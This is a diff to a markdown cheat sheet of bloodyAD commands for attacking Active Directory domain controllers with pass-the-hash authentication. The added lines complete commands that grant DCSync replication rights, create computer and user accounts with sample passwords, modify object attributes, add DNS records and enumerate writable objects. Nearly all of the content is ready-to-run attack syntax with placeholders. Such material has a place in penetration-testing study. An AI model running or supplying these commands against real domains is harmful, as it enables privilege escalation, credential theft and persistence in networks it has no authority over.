@@ -43,7 +43,7 @@ bloodyad --host <target_dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INF
 ## set - add/replace/delete target attribute  (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
 ```
 
 ## set - object onwer (pth)
@@ -54,25 +54,26 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set
 
 
 
-## add - new computer (pth)
+## add - add computer (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Jubeaz123+->
 ```
 ## add - DCSync right (pth)
 https://github.com/CravateRouge/bloodyAD
+sAMAccountName, DN, GUID or SID of the trustee
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
 ```
 ## add - DNS record (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain> --no-detail  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
 ```
 ## add - full control (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Jubeaz123+-> 
 ```
 ## add - groupMember (pth)
 https://github.com/CravateRouge/bloodyAD
@@ -105,7 +106,7 @@ https://github.com/CravateRouge/bloodyAD
 ```bash
 bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get  
 ```
-## get - DNS records (pth)
+## get - DNS dump records (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
 bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain>  
@@ -128,7 +129,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get 
 ## get - writable (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get writable
 ```
 
 ## remove - DCSync (pth)
